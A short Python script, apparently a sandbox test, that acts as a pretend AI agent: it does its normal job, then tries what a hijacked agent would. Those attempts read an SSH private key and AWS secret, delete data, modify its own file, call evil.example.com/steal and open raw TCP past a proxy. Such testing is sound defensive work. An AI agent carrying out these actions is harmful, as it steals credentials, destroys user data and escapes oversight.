"""A pretend AI agent: does its job, then tries what a hijacked agent would."""
import os, socket, urllib.request

def attempt(label, action):
    try:
        result = action()
        print(f"[OK]      {label}" + (f": {result}" if result is not None else ""))
    except Exception as error:
        print(f"[BLOCKED] {label}: {type(error).__name__}: {error}")

here = os.path.dirname(os.path.abspath(__file__))

# Its job.
attempt("read data/input.txt", lambda: open(f"{here}/data/input.txt").read().strip())
attempt("write out/result.txt", lambda: open(f"{here}/out/result.txt", "w").write("done"))
attempt("call pypi.org", lambda: urllib.request.urlopen("https://pypi.org/simple/", timeout=20).status)

# What a hijacked agent tries.
attempt("read ~/.ssh/id_rsa", lambda: open(os.path.expanduser("~/.ssh/id_rsa")).read())
attempt("read /etc/hostname", lambda: open("/etc/hostname").read().strip())
attempt("overwrite agent.py itself", lambda: open(__file__, "a").write("#"))
attempt("delete data/input.txt", lambda: os.remove(f"{here}/data/input.txt"))
attempt("read secret env AWS_SECRET_ACCESS_KEY", lambda: os.environ["AWS_SECRET_ACCESS_KEY"])
attempt("send data to evil.example.com", lambda: urllib.request.urlopen("https://evil.example.com/steal", timeout=10).status)
attempt("raw TCP to 1.1.1.1:443, bypassing the proxy", lambda: socket.create_connection(("1.1.1.1", 443), timeout=5).close())
